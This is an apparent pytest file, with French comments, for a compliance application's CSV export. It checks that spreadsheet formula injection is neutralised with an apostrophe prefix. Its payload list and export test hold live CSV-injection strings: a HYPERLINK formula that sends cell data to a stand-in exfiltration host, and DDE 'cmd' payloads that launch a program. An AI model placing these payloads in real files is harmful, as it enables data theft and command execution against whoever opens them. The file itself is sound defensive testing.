"""
Exports CSV : une cellule ne doit pas devenir une formule.

Les exports de Fiskr sont faits **pour être ouverts dans Excel** — BOM UTF-8,
séparateur « ; », le commentaire du code le dit. Et leur contenu vient de
l'extérieur :

* noms et motifs de désignation des fiches listées, téléchargés depuis les
  sources officielles ;
* référentiel clients, importé par CSV ;
* **parties de messages de paiement ISO 20022**, reçues d'un système amont ;
* commentaires et justifications saisis par les analystes.

Une cellule commençant par `=`, `+`, `-` ou `@` est **évaluée à l'ouverture**.
`=HYPERLINK("http://serveur/?"&A1,"Cliquez")` exfiltre la ligne voisine d'un
clic ; les variantes `=cmd|'/c …'!A1` vont plus loin. Le vecteur le plus
réaliste ici est le message de paiement : un nom de partie forgé traverse le
filtrage, atterrit dans le journal d'audit, et ressort dans l'export qu'un
responsable conformité ouvre dans Excel.

La parade est le préfixe apostrophe (OWASP) : le tableur affiche la valeur et
ne l'évalue pas. La donnée n'est pas altérée, elle est marquée comme texte.

Le test porte sur `_csv_response`, **point de passage unique** de tous les
exports : c'est le seul endroit où la garantie doit tenir, et le seul où elle
peut être contournée.
"""
import csv
import io

import pytest

from fiskr.api import _csv_neutralise, _csv_response, _CSV_DEBUTS_DANGEREUX

CHARGES = [
    '=cmd|\'/c calc\'!A1',
    '=HYPERLINK("http://exfiltration.example/?"&A1,"Cliquez ici")',
    '+1+1',
    '-2+3+cmd|\' /c calc\'!A0',
    '@SUM(1+1)*cmd|\' /c calc\'!A0',
    '\t=1+1',
    '\r=1+1',
]


@pytest.mark.parametrize("charge", CHARGES)
def test_une_charge_utile_connue_est_neutralisee(charge):
    sortie = _csv_neutralise(charge)
    assert sortie.startswith("'"), f"{charge!r} reste une formule"
    assert sortie[1:] == charge, "la donnée doit être préservée telle quelle"


@pytest.mark.parametrize("valeur", [
    "Jean Dupont", "MOHAMMED ALI", "a=b", "Société 3-2-1", "", "  =pas en tête",
    "Motif : gel des avoirs (UE 2026/1234)",
])
def test_une_valeur_legitime_n_est_pas_touchee(valeur):
    assert _csv_neutralise(valeur) == valeur


@pytest.mark.parametrize("valeur", [None, 0, 12.5, True])
def test_les_valeurs_non_textuelles_traversent_intactes(valeur):
    assert _csv_neutralise(valeur) is valeur


def test_tous_les_caracteres_dangereux_sont_couverts():
    """La liste doit couvrir ce qu'Excel, LibreOffice et Google Sheets
    interprètent en tête de cellule."""
    for caractere in ("=", "+", "-", "@", "\t", "\r"):
        assert caractere in _CSV_DEBUTS_DANGEREUX, caractere
        assert _csv_neutralise(caractere + "X").startswith("'")


def test_l_export_complet_neutralise_chaque_cellule():
    """Le point de passage unique : en-tête comprise, sur toutes les colonnes,
    pas seulement la première."""
    entete = ["client", "=colonne_forgee", "score"]
    lignes = [
        ["Jean Dupont", '=HYPERLINK("http://x/?"&A1,"clic")', 95.0],
        ['=cmd|\'/c calc\'!A1', "MOHAMMED ALI", 100.0],
    ]
    reponse = _csv_response("test.csv", entete, lignes)
    contenu = reponse.body.decode("utf-8").lstrip("﻿")
    lues = list(csv.reader(io.StringIO(contenu), delimiter=";"))

    assert lues[0] == ["client", "'=colonne_forgee", "score"]
    assert lues[1] == ["Jean Dupont", '\'=HYPERLINK("http://x/?"&A1,"clic")', "95.0"]
    assert lues[2] == ['\'=cmd|\'/c calc\'!A1', "MOHAMMED ALI", "100.0"]

    # Aucune cellule ne commence par un caractere de formule
    for ligne in lues:
        for cellule in ligne:
            assert not cellule or cellule[0] not in ("=", "+", "@"), cellule


def test_l_export_reste_ouvrable_dans_excel():
    """La neutralisation ne doit pas casser ce pour quoi l'export existe."""
    reponse = _csv_response("test.csv", ["a", "b"], [["x", "y"]])
    contenu = reponse.body.decode("utf-8")
    assert contenu.startswith("\ufeff"), "BOM UTF-8 perdu"
    assert "text/csv" in reponse.media_type
    assert ";" in contenu, "séparateur « ; » perdu (ouverture Excel FR)"
    assert 'filename="test.csv"' in reponse.headers["content-disposition"]


def test_tous_les_exports_passent_par_le_point_unique():
    """Un export qui écrirait son CSV lui-même contournerait la garantie."""
    import inspect
    import re
    from fiskr import api
    source = inspect.getsource(api)
    ecritures = re.findall(r"^\s*\w*writer\w*\s*=\s*.*csv\.writer", source, re.M)
    assert len(ecritures) == 1, (
        f"{len(ecritures)} écritures CSV : une seule doit exister, dans _csv_response")
